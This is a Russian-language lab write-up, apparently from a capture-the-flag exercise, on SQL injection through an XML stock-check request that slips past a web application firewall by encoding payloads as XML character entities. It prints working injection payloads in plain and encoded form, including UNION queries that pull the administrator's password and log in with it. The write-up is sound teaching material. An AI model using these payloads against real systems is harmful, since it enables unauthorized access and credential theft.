# SQL-–∏–Ω—ä–µ–∫—Ü–∏—è —Å –æ–±—Ö–æ–¥–æ–º —Ñ–∏–ª—å—Ç—Ä–∞ —á–µ—Ä–µ–∑ XML

–í—ã–±–µ—Ä–∏—Ç–µ —è–∑—ã–∫ / Choose your language:

- üá∑üá∫ [–†—É—Å—Å–∫–∏–π](WRITEUP.ru.md)  
- üá¨üáß [English](WRITEUP.en.md)

## –î–∏—Å–∫–ª–µ–π–º–µ—Ä
---

**–¢–µ–∫—Å—Ç –±—ã–ª –Ω–∞–ø–∏—Å–∞–Ω –∏ –ø–µ—Ä–µ–≤–µ–¥–µ–Ω –∞–≤—Ç–æ—Ä–æ–º –≤—Ä—É—á–Ω—É—é. –Ø–∑—ã–∫–æ–≤–∞—è –º–æ–¥–µ–ª—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª–∞—Å—å –¥–ª—è —Ñ–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –∏ —Å—Ç–∏–ª–∏—Å—Ç–∏—á–µ—Å–∫–æ–π –ø—Ä–∞–≤–∫–∏.**

**–î–∞–Ω–Ω—ã–π –º–∞—Ç–µ—Ä–∏–∞–ª –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω –∏—Å–∫–ª—é—á–∏—Ç–µ–ª—å–Ω–æ –≤ –æ–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã—Ö –∏ –∏—Å—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏—Ö —Ü–µ–ª—è—Ö. –Ø –Ω–µ –ø—Ä–∏–∑—ã–≤–∞—é –∏ –Ω–µ –ø–æ–æ—â—Ä—è—é –Ω–µ—Å–∞–Ω–∫—Ü–∏–æ–Ω–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –¥–æ—Å—Ç—É–ø –∫ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–æ–Ω–Ω—ã–º —Å–∏—Å—Ç–µ–º–∞–º –∏–ª–∏ –Ω–∞—Ä—É—à–µ–Ω–∏–µ –∑–∞–∫–æ–Ω–∞. –ü–æ –º–æ–µ–º—É –º–Ω–µ–Ω–∏—é, –æ–¥–Ω–∏–º –∏–∑ –Ω–∞–∏–±–æ–ª–µ–µ —ç—Ñ—Ñ–µ–∫—Ç–∏–≤–Ω—ã—Ö —Å–ø–æ—Å–æ–±–æ–≤ –±–æ—Ä—å–±—ã —Å –∫–∏–±–µ—Ä–ø—Ä–µ—Å—Ç—É–ø–Ω–æ—Å—Ç—å—é —è–≤–ª—è–µ—Ç—Å—è –ø—Ä–æ—Å–≤–µ—â–µ–Ω–∏–µ –∫–∞–∫ —Ä—è–¥–æ–≤—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –∏ —Ä—É–∫–æ–≤–æ–¥–∏—Ç–µ–ª–µ–π, —Ç–∞–∫ –∏ —Ä–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫–æ–≤ —Ü–∏—Ñ—Ä–æ–≤—ã—Ö –ø—Ä–æ–¥—É–∫—Ç–æ–≤ –æ —Ä–∞—Å–ø—Ä–æ—Å—Ç—Ä–∞–Ω–µ–Ω–Ω—ã—Ö —É—è–∑–≤–∏–º–æ—Å—Ç—è—Ö, –∫–æ—Ç–æ—Ä—ã–µ –ø–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω–æ –º–æ–≥—É—Ç –±—ã—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω—ã –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∞–º–∏ –¥–ª—è —Å–æ–≤–µ—Ä—à–µ–Ω–∏—è –ø—Ä–æ—Ç–∏–≤–æ–ø—Ä–∞–≤–Ω—ã—Ö –¥–µ–π—Å—Ç–≤–∏–π.**

**‚ö†Ô∏è –í—Å–µ –¥–µ–π—Å—Ç–≤–∏—è, –æ–ø–∏—Å–∞–Ω–Ω—ã–µ –≤ —ç—Ç–æ–º –¥–æ–∫—É–º–µ–Ω—Ç–µ, –±—ã–ª–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω—ã –≤ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–Ω–æ–π –∏—Å—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–π —Å—Ä–µ–¥–µ (CTF/—Ç–µ—Å—Ç–æ–≤—ã–π –ø–æ–ª–∏–≥–æ–Ω), –±–µ–∑ –Ω–∞—Ä—É—à–µ–Ω–∏—è –ø—Ä–∞–≤ —Ç—Ä–µ—Ç—å–∏—Ö –ª–∏—Ü –∏–ª–∏ –¥–µ–π—Å—Ç–≤—É—é—â–µ–≥–æ –∑–∞–∫–æ–Ω–æ–¥–∞—Ç–µ–ª—å—Å—Ç–≤–∞.**

**–ù–µ—Å–∞–Ω–∫—Ü–∏–æ–Ω–∏—Ä–æ–≤–∞–Ω–Ω–æ–µ –≤–º–µ—à–∞—Ç–µ–ª—å—Å—Ç–≤–æ –≤ –∫–æ–º–ø—å—é—Ç–µ—Ä–Ω—ã–µ —Å–∏—Å—Ç–µ–º—ã, –Ω–∞—Ä—É—à–µ–Ω–∏–µ –ø—Ä–∞–≤–∏–ª —Ö—Ä–∞–Ω–µ–Ω–∏—è –∏ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –¥–∞–Ω–Ω—ã—Ö –∏ –¥—Ä—É–≥–∏–µ —Ñ–æ—Ä–º—ã —Ç–∞–∫ –Ω–∞–∑—ã–≤–∞–µ–º–æ–≥–æ ¬´—á–µ—Ä–Ω–æ–≥–æ¬ª —Ö–∞–∫–µ—Ä—Å—Ç–≤–∞ –ø—Ä–æ—Ç–∏–≤–æ—Ä–µ—á–∞—Ç –∑–∞–∫–æ–Ω—É –∏ —ç—Ç–∏–∫–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–æ–Ω–Ω–æ–π –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏.**

**–Ø –ø—Ä–∏–¥–µ—Ä–∂–∏–≤–∞—é—Å—å –ø—Ä–∏–Ω—Ü–∏–ø–æ–≤ —ç—Ç–∏—á–Ω–æ–≥–æ –∏—Å—Å–ª–µ–¥–æ–≤–∞–Ω–∏—è –∏ –æ—Ç–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ–≥–æ —Ä–∞—Å–∫—Ä—ã—Ç–∏—è —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π.**

## –ü—Ä–∏–ª–æ–∂–µ–Ω–∏–µ
---

![placeholder](images/labCard.png)

–ü—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è–µ—Ç —Å–æ–±–æ–π –º–∞–≥–∞–∑–∏–Ω —Å –∑–∞–±–∞–≤–Ω—ã–º–∏ —Ç–æ–≤–∞—Ä–∞–º–∏:

![–õ–∞–±](images/SqliLab3Target.png)

## –§—É–Ω–∫—Ü–∏–æ–Ω–∞–ª
---

–£ –∫–∞–∂–¥–æ–≥–æ —Ç–æ–≤–∞—Ä–∞ –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–µ –¥–µ—Ç–∞–ª–µ–π –µ—Å—Ç—å –∫–Ω–æ–ø–∫–∞ `Check stock`, –∫–æ—Ç–æ—Ä–∞—è –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –µ–¥–∏–Ω–∏—Ü —Ç–æ–≤–∞—Ä–∞ –Ω–∞ —Å–∫–ª–∞–¥–∞—Ö –≤ —Ä–∞–∑–Ω—ã—Ö –≥–æ—Ä–æ–¥–∞—Ö:

![–ü–æ–∏—Å–∫](images/SqliLab3Function.png)

–§—É–Ω–∫—Ü–∏—è `Check stock` –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç –Ω–∞ –±—ç–∫–µ–Ω–¥ –∑–∞–ø—Ä–æ—Å, —Å–æ–¥–µ—Ä–∂–∞—â–∏–π XML:

![–ó–∞–ø—Ä–æ—Å](images/SqliLab3CheckStockXML.png)

```XML
<?xml version="1.0" encoding="UTF-8"?>
	<stockCheck>
		<productId>
			13
		</productId>
		<storeId>
			1
		</storeID>
	</stockCheck>
```

–≠—Ç–æ –∏ –µ—Å—Ç—å –Ω–∞—à–∞ —Ç–æ—á–∫–∞ –∏–Ω—ä–µ–∫—Ü–∏–∏!

## –≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è
---

–û–¥–Ω–∞–∫–æ WAF –æ–±–Ω–∞—Ä—É–∂–∏—Ç —Å—ã—Ä–æ–π –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π –≤–≤–æ–¥:

![–ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞](images/SqliLab3WAFBlock.png)

–ü—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –ø–æ-–ø—Ä–µ–∂–Ω–µ–º—É –±—É–¥–µ—Ç –ø–æ–Ω–∏–º–∞—Ç—å –∑–∞–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–Ω—É—é –≤–µ—Ä—Å–∏—é `storeId`, –ø—Ä–∏ —É—Å–ª–æ–≤–∏–∏, —á—Ç–æ –æ–Ω–∞ –≤–∞–ª–∏–¥–Ω–∞. –í –¥–∞–Ω–Ω–æ–º —Å–ª—É—á–∞–µ `storeId = 1` –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç—Å—è —Ç–∞–∫ –∂–µ, –∫–∞–∫ `storeId = &#49;`:

![–°–∏–º–≤–æ–ªXML](images/LabSqliXMLWorks.png)

–≠—Ç–æ –æ–∑–Ω–∞—á–∞–µ—Ç, —á—Ç–æ –º–æ–∂–Ω–æ –ø–µ—Ä–µ–¥–∞–≤–∞—Ç—å –ø–æ–ª–µ–∑–Ω—ã–µ –Ω–∞–≥—Ä—É–∑–∫–∏, –∑–∞–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ –≤ XML, –¥–ª—è —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏ —É—è–∑–≤–∏–º–æ—Å—Ç–∏ SQL-–∏–Ω—ä–µ–∫—Ü–∏–∏.

```SQL
1' OR 1=1 --
```

–ù–∏–∂–µ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∞ –≤–µ—Ä—Å–∏—è —ç—Ç–æ–π PoC-–Ω–∞–≥—Ä—É–∑–∫–∏ –¥–ª—è SQL-–∏–Ω—ä–µ–∫—Ü–∏–∏, –∑–∞–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–Ω–∞—è –≤ XML:

```XML
&#49;&#39;&#32;&#79;&#82;&#32;&#49;&#61;&#49;&#32;&#45;&#45;&#32;
```

–≠—Ç–æ –ø—Ä–∏–≤–µ–¥–µ—Ç –∫ –≤—ã–≤–æ–¥—É –≤—Å–µ—Ö –µ–¥–∏–Ω–∏—Ü —Ç–æ–≤–∞—Ä–∞ –≤–æ –≤—Å–µ—Ö –º–∞–≥–∞–∑–∏–Ω–∞—Ö:

![PoC](images/SqliLab3Poc2.png)

–£—á–∏—Ç—ã–≤–∞—è, —á—Ç–æ –≥–ª–∞–≤–Ω–∞—è —Ü–µ–ª—å –ª–∞–±—ã ‚Äî –≤–æ–π—Ç–∏ –≤ —Å–∏—Å—Ç–µ–º—É –∫–∞–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å `administrator`, –ª—É—á—à–∏–º –≤–∞—Ä–∏–∞–Ω—Ç–æ–º —è–≤–ª—è–µ—Ç—Å—è –ø–æ–¥—Ö–æ–¥ –Ω–∞ –æ—Å–Ω–æ–≤–µ `UNION`.

–≠—Ç–æ—Ç –∑–∞–ø—Ä–æ—Å –ø–æ–∑–≤–æ–ª–∏—Ç –ø—Ä–æ–≤–µ—Ä–∏—Ç—å, —Å–∫–æ–ª—å–∫–æ —Å—Ç–æ–ª–±—Ü–æ–≤ –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç –∑–∞–ø—Ä–æ—Å, –∏ –¥–æ—Å—Ç—É–ø–Ω–∞ –ª–∏ —Ç–∞–±–ª–∏—Ü–∞ `users` (–≤ –¥–∞–Ω–Ω–æ–º —Å–ª—É—á–∞–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ `NULL`-–∑–∞–ø–æ–ª–Ω–∏—Ç–µ–ª–µ–π —Ä–∞–≤–Ω–æ 1):

```SQL
1' UNION SELECT NULL FROM users --
```

–ó–∞–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–æ –≤ XML:

```XML
&#49;&#39;&#32;&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#78;&#85;&#76;&#76;&#32;&#70;&#82;&#79;&#77;&#32;&#117;&#115;&#101;&#114;&#115;&#32;&#45;&#45;&#32;
```

–û–Ω —Ä–∞–±–æ—Ç–∞–µ—Ç!

![–£—Å–ø–µ—ÖUnion](images/SqliLab3UnionSuccess.png)

–¢–µ–ø–µ—Ä—å –∏–∑–≤–ª–µ—á–µ–º –¥–∞–Ω–Ω—ã–µ –∏–∑ —Ç–∞–±–ª–∏—Ü—ã `users`:

```SQL
1' UNION SELECT password FROM users WHERE username='administrator' --
```

–ö–æ–¥–∏—Ä–æ–≤–∞–Ω–∏–µ –≤ XML:

```XML
&#49;&#39;&#32;&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#32;&#70;&#82;&#79;&#77;&#32;&#117;&#115;&#101;&#114;&#115;&#32;&#87;&#72;&#69;&#82;&#69;&#32;&#117;&#115;&#101;&#114;&#110;&#97;&#109;&#101;&#61;&#39;&#97;&#100;&#109;&#105;&#110;&#105;&#115;&#116;&#114;&#97;&#116;&#111;&#114;&#39;&#32;&#45;&#45;&#32;
```

![–£—Å–ø–µ—ÖUnion2](images/SqliLab3UnionPasswordSuccess.png)

–ß—Ç–æ–±—ã —Å–¥–µ–ª–∞—Ç—å —Ä–µ–∑—É–ª—å—Ç–∞—Ç –±–æ–ª–µ–µ –Ω–∞–≥–ª—è–¥–Ω—ã–º, –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É —Å –∫–æ–Ω–∫–∞—Ç–µ–Ω–∞—Ü–∏–µ–π, —á—Ç–æ–±—ã –∏–∑–≤–ª–µ—á—å –æ–¥–Ω–æ–≤—Ä–µ–º–µ–Ω–Ω–æ `username` –∏ `password` –∏–∑ —Ç–∞–±–ª–∏—Ü—ã, —Ä–∞–∑–¥–µ–ª–∏–≤ –∏—Ö —Ä–∞–∑–¥–µ–ª–∏—Ç–µ–ª–µ–º `\|/`:

```SQL
1' UNION SELECT username || '\|/' || password FROM users WHERE username='administrator' --
```

–ó–∞–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–æ –≤ XML:

```XML
&#49;&#39;&#32;&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#117;&#115;&#101;&#114;&#110;&#97;&#109;&#101;&#32;&#124;&#124;&#32;&#39;&#92;&#124;&#47;&#39;&#32;&#124;&#124;&#32;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#32;&#70;&#82;&#79;&#77;&#32;&#117;&#115;&#101;&#114;&#115;&#32;&#87;&#72;&#69;&#82;&#69;&#32;&#117;&#115;&#101;&#114;&#110;&#97;&#109;&#101;&#61;&#39;&#97;&#100;&#109;&#105;&#110;&#105;&#115;&#116;&#114;&#97;&#116;&#111;&#114;&#39;&#32;&#45;&#45;&#32;
```

![–†–∞–∑–¥–µ–ª–∏—Ç–µ–ª—å](images/SqliLab3UnionDelimeter.png)

–¢–µ–ø–µ—Ä—å –ø–æ–ª—É—á–µ–Ω–Ω—ã–µ —É—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –¥–ª—è –≤—Ö–æ–¥–∞ –≤ —Å–∏—Å—Ç–µ–º—É –∫–∞–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å `administrator`, —á—Ç–æ —Ä–µ—à–∞–µ—Ç –ª–∞–±—É:

![–†–µ—à–µ–Ω–∏–µ](images/Lab3Solved.png)

–°–ø–∞—Å–∏–±–æ –∑–∞ –≤–Ω–∏–º–∞–Ω–∏–µ! ^^